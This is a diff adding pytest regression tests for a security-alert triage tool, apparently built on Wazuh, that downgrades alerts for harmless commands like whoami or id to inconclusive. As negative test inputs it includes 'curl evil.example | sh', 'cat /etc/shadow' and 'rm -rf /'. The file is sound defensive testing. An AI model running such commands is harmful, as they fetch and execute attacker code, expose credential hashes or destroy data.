@@ -1140,6 +1140,173 @@ class TestMechanicalAnalyzeCompose:
         cat = report_handler._derive_termination_category({}, [], "no markers here")
         assert cat == "exhaustion-escalation"
 
+
+class TestBenignActionShortCircuit:
+    """Regression tests for the CONCLUDE-time benign-action override.
+
+    The short-circuit fires when ANALYZE routes `disposition: true_positive`
+    purely by exhaustion (no anchor confirmed it, no archetype grounded),
+    the alert's command body is on the playbook's benign-action list, and
+    termination_category is trust-root or exhaustion-escalation. It rewrites
+    the disposition to `inconclusive` so a non-damaging command does not
+    escalate to true_positive by exhaustion alone.
+    """
+
+    def test_normalize_command_body_strips_bash_dash_c(self):
+        assert report_handler._normalize_command_body("bash -c whoami") == "whoami"
+        assert report_handler._normalize_command_body("/bin/bash -c whoami") == "whoami"
+        assert report_handler._normalize_command_body("sh -c 'id'") == "id"
+
+    def test_normalize_command_body_lowercase_idempotent(self):
+        # No wrapper to strip; just normalize case + whitespace.
+        assert report_handler._normalize_command_body("WHOAMI") == "whoami"
+        assert report_handler._normalize_command_body("  ls -la  ") == "ls -la"
+
+    def test_command_body_matches_exact_entry(self):
+        classes = ["whoami", "id", "hostname"]
+        assert (
+            report_handler._command_body_matches_benign_list("bash -c whoami", classes)
+            == "whoami"
+        )
+
+    def test_command_body_matches_prefix_with_args(self):
+        # `ls` on the list matches `ls -la /tmp` (same command + flags).
+        classes = ["ls", "ps"]
+        assert (
+            report_handler._command_body_matches_benign_list("bash -c 'ls -la /tmp'", classes)
+            == "ls"
+        )
+
+    def test_command_body_no_match_when_class_absent(self):
+        classes = ["whoami", "id"]
+        assert (
+            report_handler._command_body_matches_benign_list("bash -c 'curl evil.example | sh'", classes)
+            is None
+        )
+
+    def test_command_body_multi_token_class_requires_exact_prefix(self):
+        # Multi-token class only matches when the body is the same prefix —
+        # `cat /etc/os-release` matches that, not `cat /etc/shadow`.
+        classes = ["cat /etc/os-release"]
+        assert (
+            report_handler._command_body_matches_benign_list(
+                "bash -c 'cat /etc/os-release'", classes,
+            )
+            == "cat /etc/os-release"
+        )
+        assert (
+            report_handler._command_body_matches_benign_list(
+                "bash -c 'cat /etc/shadow'", classes,
+            )
+            is None
+        )
+
+    def test_short_circuit_no_op_when_disposition_not_true_positive(self, tmp_path):
+        # ANALYZE routed benign — short-circuit must not interfere.
+        ctx = _make_ctx_for_shortcircuit(tmp_path, cmdline="bash -c whoami")
+        d, c, applied, matched = report_handler._maybe_apply_benign_action_shortcircuit(
+            ctx,
+            disposition="benign",
+            confidence="high",
+            termination_category="trust-root",
+            surviving_hypotheses=["h-001"],
+        )
+        assert (d, c, applied, matched) == ("benign", "high", False, None)
+
+    def test_short_circuit_no_op_when_termination_not_trust_or_exhaustion(self, tmp_path):
+        ctx = _make_ctx_for_shortcircuit(tmp_path, cmdline="bash -c whoami")
+        d, c, applied, _ = report_handler._maybe_apply_benign_action_shortcircuit(
+            ctx,
+            disposition="true_positive",
+            confidence="medium",
+            termination_category="adversarial-refuted",
+            surviving_hypotheses=["h-001"],
+        )
+        # Adversarial-refuted is a meaningful escalation — don't override.
+        assert (d, c, applied) == ("true_positive", "medium", False)
+
+    def test_short_circuit_no_op_when_signature_lacks_benign_list(self, tmp_path):
+        # 5710 has no `## Benign action classes` section.
+        ctx = _make_ctx_for_shortcircuit(
+            tmp_path, cmdline="bash -c whoami", signature_id="wazuh-rule-5710",
+        )
+        d, c, applied, _ = report_handler._maybe_apply_benign_action_shortcircuit(
+            ctx,
+            disposition="true_positive",
+            confidence="medium",
+            termination_category="exhaustion-escalation",
+            surviving_hypotheses=[],
+        )
+        assert (d, c, applied) == ("true_positive", "medium", False)
+
+    def test_short_circuit_fires_on_benign_command_at_trust_root(self, tmp_path):
+        ctx = _make_ctx_for_shortcircuit(tmp_path, cmdline="bash -c whoami")
+        d, c, applied, matched = report_handler._maybe_apply_benign_action_shortcircuit(
+            ctx,
+            disposition="true_positive",
+            confidence="medium",
+            termination_category="trust-root",
+            surviving_hypotheses=["h-001"],
+        )
+        assert (d, c, applied, matched) == ("inconclusive", "medium", True, "whoami")
+
+    def test_short_circuit_fires_on_exhaustion_escalation_too(self, tmp_path):
+        ctx = _make_ctx_for_shortcircuit(tmp_path, cmdline="bash -c id")
+        d, c, applied, matched = report_handler._maybe_apply_benign_action_shortcircuit(
+            ctx,
+            disposition="true_positive",
+            confidence="high",
+            termination_category="exhaustion-escalation",
+            surviving_hypotheses=["h-001"],
+        )
+        assert (d, c, applied, matched) == ("inconclusive", "medium", True, "id")
+
+    def test_short_circuit_does_not_fire_for_destructive_command(self, tmp_path):
+        ctx = _make_ctx_for_shortcircuit(
+            tmp_path, cmdline="bash -c 'rm -rf /'",
+        )
+        d, c, applied, _ = report_handler._maybe_apply_benign_action_shortcircuit(
+            ctx,
+            disposition="true_positive",
+            confidence="medium",
+            termination_category="trust-root",
+            surviving_hypotheses=["h-001"],
+        )
+        assert (d, c, applied) == ("true_positive", "medium", False)
+
+    def test_termination_rationale_cites_benign_class_when_provided(self):
+        rationale = report_handler._compose_termination_rationale(
+            "trust-root", None, None, ["h-001"],
+            benign_action_class="whoami",
+        )
+        assert "whoami" in rationale
+        assert "inconclusive" in rationale.lower()
+
+
+def _make_ctx_for_shortcircuit(
+    tmp_path: Path, *, cmdline: str, signature_id: str = "wazuh-rule-100001",
+) -> Context:
+    """Minimal Context with a real alert.json carrying the chosen cmdline.
+
+    The short-circuit reads the playbook directly off disk so signature_id
+    must point at a real signature dir; tests use 100001 (which has the
+    benign-action list) and 5710 (which doesn't) to exercise both branches.
+    """
+    import json
+    run_dir = tmp_path / "run-shortcircuit"
+    run_dir.mkdir()
+    alert = {
+        "id": "alert-shortcircuit",
+        "data": {"output_fields": {"proc": {"cmdline": cmdline}}},
+    }
+    (run_dir / "alert.json").write_text(json.dumps(alert))
+    return Context(
+        run_dir=run_dir,
+        signature_id=signature_id,
+        ticket_id="0",
+        alert=alert,
+    )
+
     def test_mechanical_analyze_path_writes_report_and_invokes_narrative(
         self, tmp_path, monkeypatch,
     ):
